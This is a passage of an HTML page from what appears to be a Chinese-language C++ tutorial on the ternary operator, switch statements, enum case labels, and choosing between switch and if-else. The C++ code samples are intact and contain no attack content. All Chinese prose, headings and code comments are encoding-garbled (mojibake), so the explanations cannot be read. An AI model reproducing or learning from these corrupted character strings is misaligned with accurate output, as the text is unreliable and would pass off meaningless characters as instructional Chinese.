ä¸­å”¯ä¸€ä¸€ä¸ªéœ€è¦ä¸‰ä¸ªæ“ä½œæ•°çš„è¿ç®—ç¬¦ã€‚å®ƒé€šå¸¸ç”¨äºæ ¹æ®æ¡ä»¶å°†ä¸¤ä¸ªå€¼ä¸­çš„ä¸€ä¸ªèµ‹ç»™å˜é‡ã€‚</p><h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>ä¸‰å…ƒè¿ç®—ç¬¦çš„è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">condition ? expression1 : expression2;</span><br></pre></td></tr></table></figure><p>å…¶å·¥ä½œæ–¹å¼æ˜¯ï¼š</p><ol><li> é¦–å…ˆè®¡ç®— <code>condition</code>ã€‚</li><li> å¦‚æœ <code>condition</code> ä¸º <code>true</code>ï¼ˆéé›¶ï¼‰ï¼Œåˆ™è®¡ç®— <code>expression1</code>ï¼Œå¹¶ä¸”æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼å°±æ˜¯ <code>expression1</code> çš„å€¼ã€‚</li><li> å¦‚æœ <code>condition</code> ä¸º <code>false</code>ï¼ˆé›¶ï¼‰ï¼Œåˆ™è®¡ç®— <code>expression2</code>ï¼Œå¹¶ä¸”æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼å°±æ˜¯ <code>expression2</code> çš„å€¼ã€‚</li></ol><p>ä¸‰å…ƒè¿ç®—ç¬¦é€šå¸¸å¯ä»¥æ›¿ä»£ç®€å•çš„ <code>if else</code> è¯­å¥ï¼Œä½¿ä»£ç æ›´ç´§å‡‘ã€‚</p><h3 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦æŸ¥æ‰¾ä¸¤ä¸ªæ•°ä¸­è¾ƒå¤§å€¼çš„ç¤ºä¾‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> max_val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦æ‰¾å‡º a å’Œ b ä¸­çš„è¾ƒå¤§å€¼</span></span><br><span class="line">    max_val = (a &gt; b) ? a : b;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The maximum value between &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; max_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: The maximum value between 10 and 20 is: 20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦ä¸€ä¸ªä¾‹å­ï¼šæ ¹æ®å¹´é¾„åˆ¤æ–­æ˜¯å¦æˆå¹´</span></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">15</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> status = (age &gt;= <span class="number">18</span>) ? <span class="string">&quot;Adult&quot;</span> : <span class="string">&quot;Minor&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Status: &quot;</span> &lt;&lt; status &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Age: 15, Status: Minor</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> åœ¨ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæ¡ä»¶ <code>(a &gt; b)</code> è¢«è¯„ä¼°ã€‚å› ä¸º <code>10 &gt; 20</code> æ˜¯ <code>false</code>ï¼Œæ‰€ä»¥è®¡ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ <code>b</code>ï¼Œå¹¶å°† <code>b</code> çš„å€¼ï¼ˆå³ <code>20</code>ï¼‰èµ‹ç»™ <code>max_val</code>ã€‚</li><li> åœ¨ç¬¬äºŒä¸ªç¤ºä¾‹ä¸­ï¼Œæ¡ä»¶ <code>(age &gt;= 18)</code> è¢«è¯„ä¼°ã€‚å› ä¸º <code>15 &gt;= 18</code> æ˜¯ <code>false</code>ï¼Œæ‰€ä»¥è®¡ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ <code>&quot;Minor&quot;</code>ï¼Œå¹¶å°†è¿™ä¸ªå­—ç¬¦ä¸²èµ‹ç»™ <code>status</code>ã€‚</li></ol><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>ç®€æ´æ€§:</strong> å¯ä»¥ç”¨ä¸€è¡Œä»£ç æ›¿ä»£å¤šè¡Œçš„ <code>if else</code> ç»“æ„ï¼Œä½¿ä»£ç æ›´ç´§å‡‘ã€‚</li></ul><p><strong>ç¼ºç‚¹:</strong></p><ul><li>  <strong>å¯è¯»æ€§:</strong> å¯¹äºå¤æ‚çš„æ¡ä»¶æˆ–è¡¨è¾¾å¼ï¼Œä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦å¯èƒ½ä¼šé™ä½ä»£ç çš„å¯è¯»æ€§ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨ <code>if else</code> è¯­å¥é€šå¸¸æ›´å¥½ã€‚</li></ul><p>ä¸‰å…ƒè¿ç®—ç¬¦æ˜¯ C++ ä¸­ä¸€ä¸ªæ–¹ä¾¿çš„å·¥å…·ï¼Œå°¤å…¶é€‚ç”¨äºç®€å•çš„æ¡ä»¶èµ‹å€¼ã€‚</p><h2 id="6-5-switch-è¯­å¥"><a href="#6-5-switch-è¯­å¥" class="headerlink" title="6.5 switch è¯­å¥"></a>6.5 switch è¯­å¥</h2><p><code>switch</code> è¯­å¥æ˜¯ C++ ä¸­å¦ä¸€ç§ç”¨äºæ§åˆ¶ç¨‹åºæµç¨‹çš„åˆ†æ”¯ç»“æ„ã€‚å®ƒå…è®¸ç¨‹åºæ ¹æ®ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä»å¤šä¸ªä»£ç å—ä¸­é€‰æ‹©ä¸€ä¸ªæ¥æ‰§è¡Œã€‚<code>switch</code> è¯­å¥é€šå¸¸ç”¨äºæ›¿ä»£å†—é•¿çš„ <code>if else if else</code> ç»“æ„ï¼Œç‰¹åˆ«æ˜¯å½“åˆ¤æ–­æ¡ä»¶åŸºäºå•ä¸ªå˜é‡æˆ–è¡¨è¾¾å¼çš„ç¦»æ•£å€¼æ—¶ã€‚</p><h3 id="ç”¨æ³•-1"><a href="#ç”¨æ³•-1" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p><code>switch</code> è¯­å¥çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> constant_expression_1:</span><br><span class="line">        <span class="comment">// code block to be executed if expression equals constant_expression_1</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// å¯é€‰ï¼Œä½†é€šå¸¸éœ€è¦</span></span><br><span class="line">    <span class="keyword">case</span> constant_expression_2:</span><br><span class="line">        <span class="comment">// code block to be executed if expression equals constant_expression_2</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// å¯é€‰</span></span><br><span class="line">    <span class="comment">// ... å¯ä»¥æœ‰æ›´å¤šçš„ case</span></span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">// å¯é€‰</span></span><br><span class="line">        <span class="comment">// code block to be executed if expression doesn&#x27;t match any case</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// å¯é€‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å·¥ä½œæ–¹å¼:</strong></p><ol><li> é¦–å…ˆè®¡ç®— <code>switch</code> æ‹¬å·å†…çš„ <code>expression</code>ï¼ˆè¡¨è¾¾å¼ï¼‰ã€‚è¿™ä¸ªè¡¨è¾¾å¼å¿…é¡»å¾—å‡ºä¸€ä¸ªæ•´æ•°ç±»å‹ï¼ˆå¦‚ <code>int</code>, <code>char</code>, <code>enum</code>ï¼‰æˆ–å¯ä»¥éšå¼è½¬æ¢ä¸ºæ•´æ•°ç±»å‹çš„å€¼ã€‚</li><li> ç¨‹åºå°† <code>expression</code> çš„å€¼ä¸æ¯ä¸ª <code>case</code> åé¢è·Ÿç€çš„ <code>constant_expression</code>ï¼ˆå¸¸é‡è¡¨è¾¾å¼ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚</li><li> å¦‚æœæ‰¾åˆ°åŒ¹é…çš„ <code>case</code>ï¼Œåˆ™æ‰§è¡Œè¯¥ <code>case</code> æ ‡ç­¾ä¸‹çš„ä»£ç å—ã€‚</li><li> <code>break</code> è¯­å¥çš„ä½œç”¨æ˜¯è·³å‡º <code>switch</code> ç»“æ„ã€‚å¦‚æœæ²¡æœ‰ <code>break</code>ï¼Œç¨‹åºä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª <code>case</code> çš„ä»£ç å—ï¼ˆç§°ä¸ºâ€œè´¯ç©¿â€ï¼‰ï¼Œç›´åˆ°é‡åˆ° <code>break</code> æˆ– <code>switch</code> è¯­å¥ç»“æŸã€‚</li><li> <code>default</code> æ ‡ç­¾æ˜¯å¯é€‰çš„ã€‚å¦‚æœ <code>expression</code> çš„å€¼ä¸æ‰€æœ‰ <code>case</code> çš„å¸¸é‡è¡¨è¾¾å¼éƒ½ä¸åŒ¹é…ï¼Œåˆ™æ‰§è¡Œ <code>default</code> æ ‡ç­¾ä¸‹çš„ä»£ç å—ã€‚å¦‚æœæ²¡æœ‰ <code>default</code> æ ‡ç­¾ä¸”æ²¡æœ‰åŒ¹é…çš„ <code>case</code>ï¼Œåˆ™ <code>switch</code> è¯­å¥ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚</li></ol><p><strong>é‡è¦é™åˆ¶:</strong></p><ul><li>  <code>case</code> æ ‡ç­¾åé¢çš„å€¼å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼ï¼ˆå¦‚å­—é¢å€¼ <code>10</code>ã€<code>&#39;A&#39;</code> æˆ– <code>const</code> æ•´æ•°å˜é‡ï¼Œæˆ–è€…æšä¸¾é‡ï¼‰ã€‚ä¸èƒ½æ˜¯å˜é‡æˆ–éå¸¸é‡è¡¨è¾¾å¼ã€‚</li><li>  <code>expression</code> çš„ç»“æœå¿…é¡»æ˜¯æ•´æ•°ç±»å‹ï¼ˆ<code>int</code>, <code>char</code>, <code>short</code>, <code>long</code>, <code>long long</code>, <code>bool</code>, <code>enum</code> ç­‰ï¼‰ã€‚ä¸èƒ½æ˜¯æµ®ç‚¹æ•° (<code>float</code>, <code>double</code>) æˆ–å­—ç¬¦ä¸² (<code>std::string</code>)ã€‚</li></ul><h3 id="ç¤ºä¾‹ä»£ç -1"><a href="#ç¤ºä¾‹ä»£ç -1" class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number (1-3): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// è·³å‡º switch</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 2.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// è·³å‡º switch</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 3.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// è·³å‡º switch</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid choice.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// default åé¢é€šå¸¸ä¹Ÿæ”¾ breakï¼Œè™½ç„¶åœ¨è¿™é‡Œä¸æ˜¯å¿…éœ€çš„ï¼Œä½†ä¿æŒä¸€è‡´æ€§æ˜¯å¥½ä¹ æƒ¯</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤ºæ²¡æœ‰ break çš„æƒ…å†µ (è´¯ç©¿)</span></span><br><span class="line">    <span class="keyword">char</span> grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nGrade example (fall-through):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">switch</span> (grade) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Excellent! &quot;</span>;</span><br><span class="line">            <span class="comment">// æ²¡æœ‰ break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Good! &quot;</span>;</span><br><span class="line">            <span class="comment">// æ²¡æœ‰ break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Passing. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// åœ¨è¿™é‡Œè·³å‡º</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>: <span class="comment">// å¯ä»¥å°†å¤šä¸ª case å…³è”åˆ°åŒä¸€ä»£ç å—</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Needs improvement. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid grade. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Good! Passing.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> ç¬¬ä¸€ä¸ª <code>switch</code> æ ¹æ®ç”¨æˆ·è¾“å…¥çš„ <code>choice</code> å€¼æ‰§è¡Œç›¸åº”çš„ <code>case</code>ã€‚<code>break</code> è¯­å¥ç¡®ä¿åªæ‰§è¡ŒåŒ¹é… <code>case</code> çš„ä»£ç ã€‚å¦‚æœè¾“å…¥ä¸æ˜¯ 1ã€2 æˆ– 3ï¼Œåˆ™æ‰§è¡Œ <code>default</code> éƒ¨åˆ†ã€‚</li><li> ç¬¬äºŒä¸ª <code>switch</code> æ¼”ç¤ºäº†â€œè´¯ç©¿â€è¡Œä¸ºã€‚å› ä¸º <code>case &#39;A&#39;</code> å’Œ <code>case &#39;B&#39;</code> åé¢æ²¡æœ‰ <code>break</code>ï¼Œå½“ <code>grade</code> ä¸º <code>&#39;B&#39;</code> æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œ <code>case &#39;B&#39;</code> çš„ä»£ç  (<code>std::cout &lt;&lt; &quot;Good! &quot;;</code>)ï¼Œç„¶åç»§ç»­æ‰§è¡Œ <code>case &#39;C&#39;</code> çš„ä»£ç  (<code>std::cout &lt;&lt; &quot;Passing. &quot;;</code>)ï¼Œç›´åˆ°é‡åˆ° <code>case &#39;C&#39;</code> ä¸­çš„ <code>break</code> æ‰è·³å‡º <code>switch</code>ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿå±•ç¤ºäº†å¦‚ä½•å°†å¤šä¸ª <code>case</code>ï¼ˆ<code>&#39;D&#39;</code> å’Œ <code>&#39;F&#39;</code>ï¼‰å…³è”åˆ°åŒä¸€ä¸ªä»£ç å—ã€‚</li></ol><h3 id="6-5-1-å°†æšä¸¾é‡ç”¨ä½œæ ‡ç­¾"><a href="#6-5-1-å°†æšä¸¾é‡ç”¨ä½œæ ‡ç­¾" class="headerlink" title="6.5.1 å°†æšä¸¾é‡ç”¨ä½œæ ‡ç­¾"></a>6.5.1 å°†æšä¸¾é‡ç”¨ä½œæ ‡ç­¾</h3><p>æšä¸¾ (<code>enum</code>) ç±»å‹çš„å€¼æ˜¯æ•´æ•°å¸¸é‡ï¼Œå› æ­¤éå¸¸é€‚åˆç”¨ä½œ <code>switch</code> è¯­å¥çš„ <code>case</code> æ ‡ç­¾ï¼Œè¿™å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªæšä¸¾ç±»å‹è¡¨ç¤ºé¢œè‰²</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Color</span> &#123;</span> RED, GREEN, BLUE, YELLOW &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color selectedColor = GREEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (selectedColor) &#123;</span><br><span class="line">        <span class="keyword">case</span> RED:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Red.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> GREEN:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¿™å°†è¢«æ‰§è¡Œ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BLUE:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Blue.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šå¦‚æœ case è¦†ç›–äº†æ‰€æœ‰æšä¸¾é‡ï¼Œå¯ä»¥çœç•¥ defaultï¼Œ</span></span><br><span class="line">        <span class="comment">// ä½†å¦‚æœæšä¸¾å¯èƒ½æ‰©å±•ï¼Œæˆ–è€…ä½ æƒ³å¤„ç†æ— æ•ˆå€¼ï¼Œæœ€å¥½åŠ ä¸Š defaultã€‚</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unknown color.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æšä¸¾é‡ä½œä¸º <code>case</code> æ ‡ç­¾æ¯”ç›´æ¥ä½¿ç”¨é­”æ³•æ•°å­—ï¼ˆå¦‚ 0, 1, 2ï¼‰æ›´æ¸…æ™°æ˜“æ‡‚ã€‚</p><h3 id="6-5-2-switch-å’Œ-if-else"><a href="#6-5-2-switch-å’Œ-if-else" class="headerlink" title="6.5.2 switch å’Œ if else"></a>6.5.2 switch å’Œ if else</h3><p><code>switch</code> è¯­å¥å¯ä»¥çœ‹ä½œæ˜¯ç‰¹å®šç±»å‹çš„ <code>if else if else</code> ç»“æ„çš„æ›¿ä»£å“ï¼Œå³åˆ¤æ–­æ¡ä»¶éƒ½åŸºäºåŒä¸€ä¸ªæ•´æ•°è¡¨è¾¾å¼çš„å€¼ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ <code>switch</code>:</strong></p><ul><li>  å½“éœ€è¦æ ¹æ®å•ä¸ªæ•´æ•°è¡¨è¾¾å¼çš„å¤šä¸ª<strong>ç‰¹å®šç¦»æ•£å€¼</strong>è¿›è¡Œåˆ†æ”¯æ—¶ã€‚</li><li>  å½“åˆ†æ”¯é€»è¾‘æ¸…æ™°ï¼Œå¯ä»¥æé«˜å¯è¯»æ€§æ—¶ã€‚</li></ul><p><strong>ä½•æ—¶ä½¿ç”¨ <code>if else if else</code>:</strong></p><ul><li>  å½“åˆ¤æ–­æ¡ä»¶æ¶‰åŠ<strong>èŒƒå›´</strong>ï¼ˆä¾‹å¦‚ <code>age &gt; 18 &amp;&amp; age &lt; 60</code>ï¼‰æ—¶ã€‚</li><li>  å½“åˆ¤æ–­æ¡ä»¶æ¶‰åŠ<strong>æµ®ç‚¹æ•°</strong>æˆ–<strong>å­—ç¬¦ä¸²</strong>æ¯”è¾ƒæ—¶ã€‚</li><li>  å½“åˆ¤æ–­æ¡ä»¶æ¯”è¾ƒå¤æ‚ï¼Œæ¶‰åŠå¤šä¸ªä¸åŒå˜é‡æˆ–é€»è¾‘è¿ç®—æ—¶ã€‚</li><li>  å½“åªæœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ªåˆ†æ”¯æ—¶ï¼Œ<code>if else</code> å¯èƒ½æ›´ç®€æ´ã€‚</li></ul><p><strong>ç¤ºä¾‹æ¯”è¾ƒ:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨ if else if</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;One&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Two&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ‰§è¡Œ</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Three&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Other&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ switch (ç­‰æ•ˆ)</span></span><br><span class="line"><span class="keyword">switch</span> (num) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;One&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Two&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span 